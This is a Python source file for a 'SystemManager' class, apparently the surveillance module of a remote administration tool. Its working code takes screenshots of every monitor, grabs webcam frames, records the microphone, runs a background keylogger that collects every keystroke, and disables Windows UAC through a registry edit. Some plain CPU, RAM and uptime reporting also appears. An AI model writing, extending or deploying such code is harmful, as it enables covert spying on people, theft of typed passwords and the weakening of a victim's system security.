import subprocess
import os
import io
import tempfile
import ctypes
import time
import hashlib
import sys
import platform
from datetime import datetime


class SystemManager:
    """Helper class for System panel operations: Screenshot, Webcam, Listener, UAC, KeyLogger, Performance."""

    _keylogger_thread = None
    _keylogger_running = False
    _keylogger_logs = []
    _keylogger_listener = None

    @staticmethod
    def get_monitors():
        """Return a list of bounding boxes for all connected monitors."""
        try:
            import ctypes
            from ctypes import wintypes
            monitors = []
            def _monitor_enum_proc(hMonitor, hdcMonitor, lprcMonitor, dwData):
                r = lprcMonitor.contents
                monitors.append((r.left, r.top, r.right, r.bottom))
                return True
            MonitorEnumProc = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HMONITOR, wintypes.HDC, ctypes.POINTER(wintypes.RECT), wintypes.LPARAM)
            ctypes.windll.user32.EnumDisplayMonitors(None, None, MonitorEnumProc(_monitor_enum_proc), 0)
            return monitors
        except Exception:
            return []

    @staticmethod
    def take_screenshot(bbox=None):
        """Take a screenshot of a specific bbox or all screens."""
        try:
            from PIL import ImageGrab
            if bbox:
                img = ImageGrab.grab(all_screens=True, bbox=bbox)
            else:
                img = ImageGrab.grab(all_screens=True)
            buf = io.BytesIO()
            img.save(buf, format='PNG')
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def take_webcam():
        """Capture a single frame from the default webcam and return bytes."""
        try:
            import cv2
            # Try multiple backends in order of reliability
            backends = [cv2.CAP_MSMF, cv2.CAP_ANY, cv2.CAP_DSHOW]
            cap = None
            for backend in backends:
                try:
                    cap = cv2.VideoCapture(0, backend)
                    if cap.isOpened():
                        break
                    cap.release()
                    cap = None
                except Exception:
                    if cap:
                        cap.release()
                    cap = None
                    continue
            if cap is None or not cap.isOpened():
                return False, "Webcam could not be opened. No working backend found."
            # Let the camera warm up
            for _ in range(5):
                cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return False, "Failed to capture frame from webcam."
            _, img_encoded = cv2.imencode('.png', frame)
            buf = io.BytesIO(img_encoded.tobytes())
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def record_microphone(duration_seconds: int):
        """Record microphone audio for the given duration and return WAV bytes."""
        try:
            import sounddevice as sd
            import wave
            import numpy as np

            # Find a real physical microphone, skip virtual/mapper devices
            skip_keywords = ['droidcam', 'virtual', 'stereo mix', 'voicemeeter', 'vb-audio', 'cable', 'sound mapper', 'primary sound']
            mic_device = None
            try:
                devices = sd.query_devices()
                for i, dev in enumerate(devices):
                    if dev['max_input_channels'] > 0 and dev['hostapi'] == 0:
                        name_lower = dev['name'].lower()
                        if not any(kw in name_lower for kw in skip_keywords):
                            mic_device = i
                            break
            except Exception:
                pass

            sample_rate = 44100
            channels = 1

            rec_kwargs = dict(
                frames=int(duration_seconds * sample_rate),
                samplerate=sample_rate,
                channels=channels,
                dtype='int16'
            )
            if mic_device is not None:
                rec_kwargs['device'] = mic_device

            recording = sd.rec(**rec_kwargs)
            sd.wait()

            buf = io.BytesIO()
            with wave.open(buf, 'wb') as wf:
                wf.setnchannels(channels)
                wf.setsampwidth(2)  # 16-bit = 2 bytes
                wf.setframerate(sample_rate)
                wf.writeframes(recording.tobytes())
            
            buf.seek(0)
            return True, buf
        except Exception as e:
            return False, str(e)

    @staticmethod
    def disable_uac():
        """Disable UAC by setting EnableLUA to 0 in the registry."""
        try:
            cmd = 'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10, encoding='utf-8', errors='replace')
            if result.returncode == 0:
                return True, "UAC disabled. Restart required to take effect."
            return False, result.stderr.strip() or "Failed to disable UAC."
        except Exception as e:
            return False, str(e)

    @staticmethod
    def start_keylogger():
        """Start the keylogger in a background thread."""
        if SystemManager._keylogger_running:
            return False, "KeyLogger is already running."
        try:
            from pynput import keyboard
            SystemManager._keylogger_logs = []
            SystemManager._keylogger_running = True

            def on_press(key):
                if not SystemManager._keylogger_running:
                    return False
                try:
                    SystemManager._keylogger_logs.append(key.char)
                except AttributeError:
                    special_keys = {
                        keyboard.Key.space: ' ',
                        keyboard.Key.enter: '\n',
                        keyboard.Key.tab: '\t',
                        keyboard.Key.backspace: '[BS]',
                        keyboard.Key.shift: '[SHIFT]',
                        keyboard.Key.shift_r: '[SHIFT]',
                        keyboard.Key.ctrl_l: '[CTRL]',
                        keyboard.Key.ctrl_r: '[CTRL]',
                        keyboard.Key.alt_l: '[ALT]',
                        keyboard.Key.alt_r: '[ALT]',
                        keyboard.Key.caps_lock: '[CAPS]',
                        keyboard.Key.esc: '[ESC]',
                        keyboard.Key.delete: '[DEL]',
                    }
                    SystemManager._keylogger_logs.append(special_keys.get(key, f'[{key.name}]'))

            SystemManager._keylogger_listener = keyboard.Listener(on_press=on_press)
            SystemManager._keylogger_listener.start()
            return True, "KeyLogger started."
        except Exception as e:
            SystemManager._keylogger_running = False
            return False, str(e)

    @staticmethod
    def stop_keylogger():
        """Stop the keylogger and return logged keys."""
        if not SystemManager._keylogger_running:
            return False, "KeyLogger is not running.", ""
        try:
            SystemManager._keylogger_running = False
            if SystemManager._keylogger_listener:
                SystemManager._keylogger_listener.stop()
                SystemManager._keylogger_listener = None
            logged = ''.join(SystemManager._keylogger_logs)
            SystemManager._keylogger_logs = []
            return True, "KeyLogger stopped.", logged
        except Exception as e:
            return False, str(e), ""

    @staticmethod
    def get_keylogger_dump():
        """Get current keylogger logs without stopping."""
        return ''.join(SystemManager._keylogger_logs)

    @staticmethod
    def get_performance():
        """Gather performance data: CPU, RAM, uptime."""
        data = {}
        try:
            import psutil
            data['cpu_percent'] = psutil.cpu_percent(interval=1)
            mem = psutil.virtual_memory()
            data['ram_total'] = f"{mem.total / (1024**3):.1f} GB"
            data['ram_percent'] = mem.percent
            data['ram_used'] = f"{mem.used / (1024**3):.1f} GB"
            data['ram_free'] = f"{mem.available / (1024**3):.1f} GB"
            data['cpu_count_physical'] = psutil.cpu_count(logical=False) or 'N/A'
            data['cpu_count_logical'] = psutil.cpu_count(logical=True) or 'N/A'
        except Exception:
            data['cpu_percent'] = 'N/A'
            data['ram_total'] = 'N/A'
            data['ram_percent'] = 'N/A'
            data['ram_used'] = 'N/A'
            data['ram_free'] = 'N/A'
            data['cpu_count_physical'] = 'N/A'
            data['cpu_count_logical'] = 'N/A'

        # CPU Name
        try:
            cpu_name = subprocess.check_output('wmic cpu get name', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['cpu_name'] = cpu_name if cpu_name else platform.processor()
        except Exception:
            data['cpu_name'] = platform.processor()

        # CPU Speed
        try:
            speed = subprocess.check_output('wmic cpu get CurrentClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            max_speed = subprocess.check_output('wmic cpu get MaxClockSpeed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['cpu_speed'] = f"{float(max_speed)/1000:.1f} GHz" if max_speed else 'N/A'
            data['cpu_current_speed'] = f"{speed} MHz" if speed else 'N/A'
        except Exception:
            data['cpu_speed'] = 'N/A'
            data['cpu_current_speed'] = 'N/A'

        # RAM Speed
        try:
            ram_speed = subprocess.check_output('wmic memorychip get Speed', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip()
            data['ram_speed'] = f"{ram_speed} MHz" if ram_speed else 'N/A'
        except Exception:
            data['ram_speed'] = 'N/A'

        # Uptime
        try:
            boot_str = subprocess.check_output('wmic os get lastbootuptime', shell=True, stderr=subprocess.DEVNULL).decode().split('\n')[1].strip().split('.')[0]
            boot_time = datetime.strptime(boot_str, '%Y%m%d%H%M%S')
            uptime_delta = datetime.now() - boot_time
            total_minutes = int(uptime_delta.total_seconds() / 60)
            data['uptime'] = f"{total_minutes} Minutes"
        except Exception:
            data['uptime'] = 'N/A'

        return data


